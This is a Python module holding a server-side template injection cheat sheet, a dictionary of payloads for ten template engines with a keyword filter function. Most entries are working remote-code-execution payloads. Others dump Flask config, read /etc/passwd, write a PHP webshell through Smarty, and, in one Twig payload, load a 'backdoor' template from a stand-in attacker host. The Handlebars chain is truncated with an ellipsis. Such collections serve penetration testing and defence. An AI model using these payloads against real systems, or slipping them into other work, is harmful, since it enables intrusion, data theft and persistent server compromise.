"""SSTI (Server-Side Template Injection) cheat sheet."""

SSTI_CHEATSHEET = {
    "title": "SSTI (Server-Side Template Injection) Cheat Sheet",
    "categories": {
        "detection": {
            "title": "Detection Payloads",
            "description": "Payloads to detect template injection vulnerabilities",
            "payloads": [
                {"payload": "{{7*7}}", "description": "Jinja2/Twig basic test"},
                {"payload": "${7*7}", "description": "Freemarker/Velocity test"},
                {"payload": "<%= 7*7 %>", "description": "ERB (Ruby) test"},
                {"payload": "#{7*7}", "description": "Ruby interpolation"},
                {"payload": "${{7*7}}", "description": "Alternative syntax"},
                {"payload": "@(1+1)", "description": "Razor (C#) test"},
                {"payload": "{{7*'7'}}", "description": "Jinja2 string multiply"},
                {"payload": "*{7*7}", "description": "Thymeleaf test"},
                {"payload": "{7*7}", "description": "Smarty test"},
                {"payload": "[[${7*7}]]", "description": "Thymeleaf inline"},
            ],
        },

        "jinja2": {
            "title": "Jinja2 (Python)",
            "description": "Jinja2 template engine exploits",
            "payloads": [
                {"payload": "{{config}}", "description": "Dump Flask config"},
                {"payload": "{{config.items()}}", "description": "Config as items"},
                {"payload": "{{self.__class__.__mro__}}", "description": "Method resolution order"},
                {"payload": "{{''.__class__.__mro__}}", "description": "String class MRO"},
                {"payload": "{{''.__class__.__mro__[2].__subclasses__()}}", "description": "All subclasses"},
                {"payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "description": "RCE via os.popen"},
                {"payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}", "description": "RCE via cycler"},
                {"payload": "{{joiner.__init__.__globals__.os.popen('id').read()}}", "description": "RCE via joiner"},
                {"payload": "{{namespace.__init__.__globals__.os.popen('id').read()}}", "description": "RCE via namespace"},
            ],
        },

        "twig": {
            "title": "Twig (PHP)",
            "description": "Twig template engine exploits",
            "payloads": [
                {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "description": "RCE via callback"},
                {"payload": "{{['id']|filter('system')}}", "description": "RCE via filter"},
                {"payload": "{{['cat /etc/passwd']|filter('system')}}", "description": "Read passwd"},
                {"payload": "{{_self.env.setCache('ftp://attacker.net:21')}}{{_self.env.loadTemplate('backdoor')}}", "description": "Remote template load"},
                {"payload": "{{app.request.server.all|join(',')}}", "description": "Dump server vars"},
            ],
        },

        "smarty": {
            "title": "Smarty (PHP)",
            "description": "Smarty template engine exploits",
            "payloads": [
                {"payload": "{php}echo `id`;{/php}", "description": "PHP tag execution"},
                {"payload": "{system('id')}", "description": "System function"},
                {"payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[c]); ?>',self::clearConfig())}", "description": "Write webshell"},
            ],
        },

        "freemarker": {
            "title": "Freemarker (Java)",
            "description": "Freemarker template engine exploits",
            "payloads": [
                {"payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', "description": "RCE via Execute"},
                {"payload": '${7*7}', "description": "Expression evaluation"},
                {"payload": '<#assign cmd = "freemarker.template.utility.Execute"?new()>${cmd("id")}', "description": "Alternative RCE"},
            ],
        },

        "velocity": {
            "title": "Velocity (Java)",
            "description": "Apache Velocity template engine exploits",
            "payloads": [
                {"payload": "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('id'))##", "description": "Runtime exec"},
                {"payload": "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')", "description": "Inspect and exec"},
            ],
        },

        "thymeleaf": {
            "title": "Thymeleaf (Java)",
            "description": "Thymeleaf template engine exploits",
            "payloads": [
                {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "description": "SpEL RCE"},
                {"payload": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "description": "Preprocessing RCE"},
                {"payload": "${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}", "description": "Alternative RCE"},
            ],
        },

        "mako": {
            "title": "Mako (Python)",
            "description": "Mako template engine exploits",
            "payloads": [
                {"payload": "<%import os%>${os.popen('id').read()}", "description": "Import and exec"},
                {"payload": "<%import os; x=os.popen('id').read()%>${x}", "description": "Store result"},
            ],
        },

        "erb": {
            "title": "ERB (Ruby)",
            "description": "ERB template engine exploits",
            "payloads": [
                {"payload": "<%= 7*7 %>", "description": "Expression evaluation"},
                {"payload": "<%= system('id') %>", "description": "System command"},
                {"payload": "<%= `id` %>", "description": "Backtick execution"},
                {"payload": "<%= IO.popen('id').readlines() %>", "description": "IO popen"},
                {"payload": "<%= require 'open3'; Open3.capture2('id')[0] %>", "description": "Open3 capture"},
            ],
        },

        "nunjucks": {
            "title": "Nunjucks/Mozilla (JavaScript)",
            "description": "Nunjucks template engine exploits",
            "payloads": [
                {"payload": "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "description": "RCE via constructor"},
                {"payload": "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "description": "Alternative RCE"},
            ],
        },

        "handlebars": {
            "title": "Handlebars (JavaScript)",
            "description": "Handlebars template engine exploits",
            "payloads": [
                {"payload": "{{#with 's' as |string|}}{{#with 'e'}}{{#with split as |conslist|}}...{{/with}}{{/with}}{{/with}}", "description": "Complex RCE chain"},
            ],
        },
    },
}


def get_cheatsheet(category: str = None, filter_keyword: str = None) -> dict:
    """Get SSTI cheatsheet."""
    if category and category in SSTI_CHEATSHEET["categories"]:
        result = {
            "title": SSTI_CHEATSHEET["title"],
            "categories": {category: SSTI_CHEATSHEET["categories"][category]},
        }
    else:
        result = SSTI_CHEATSHEET

    if filter_keyword:
        filtered_categories = {}
        for cat_name, cat_data in result["categories"].items():
            filtered_payloads = [
                p for p in cat_data["payloads"]
                if filter_keyword.lower() in p["payload"].lower()
                or filter_keyword.lower() in p["description"].lower()
            ]
            if filtered_payloads:
                filtered_categories[cat_name] = {
                    **cat_data,
                    "payloads": filtered_payloads,
                }
        result["categories"] = filtered_categories

    return result
